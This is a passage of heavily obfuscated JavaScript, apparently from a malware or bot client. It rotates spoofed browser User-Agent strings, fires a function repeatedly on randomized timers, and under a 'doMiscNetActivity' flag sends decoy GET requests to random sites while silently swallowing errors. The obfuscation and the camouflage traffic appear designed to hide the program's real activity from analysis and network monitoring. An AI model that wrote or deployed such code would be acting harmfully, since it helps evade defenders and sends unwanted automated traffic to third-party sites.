      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x3 * 0xca0 + -0x4e2 + 0x1 * 0x2ac2; k < -0x1 * 0x213a + -0xa75 + -0x1 * -0x2bb3; k++)
    setTimeout(f, (-0x213b + 0x1c9 * -0x76 + -0x1 * -0x1de41) * k * getRandomInt(-0x3 * 0xbd5 + 0x116 * -0x13 + 0x1c11 * 0x2, 0x3 * 0xc3 + -0x20f * 0x5 + 0x1 * 0x805));
  setInterval(() => {
    f();
    for (let l = -0x16 * 0x161 + 0x14f + 0x1d07; l < 0x1 * -0x1246 + -0x1759 + 0x29a3; l++)
      setTimeout(f, (0x2 * -0x1e41 + -0x8 * -0x1d16 + 0x3e32) * l * getRandomInt(-0x196f + -0x1 * -0x455 + 0x151b, -0x1703 + -0x121 + 0x80d * 0x3));
  }, -0x1d14d5 * 0x2 + -0x74 * -0xbf4d + -0x6 * -0x466e1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a7 = d,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents['random']()
      }
    });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })[a7(0xe)](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x5 * -0x4d0 + 0x2 * -0xebb + -0x2fa * -0xb) * getRandomInt(-0x19e3 + 0x9ce + -0x1d * -0x8e, -0xdbb * 0x1 + -0x1 * -0x1977 + -0xbb7));
}, 0x185c + 0x122c + -0xae * 0x3e);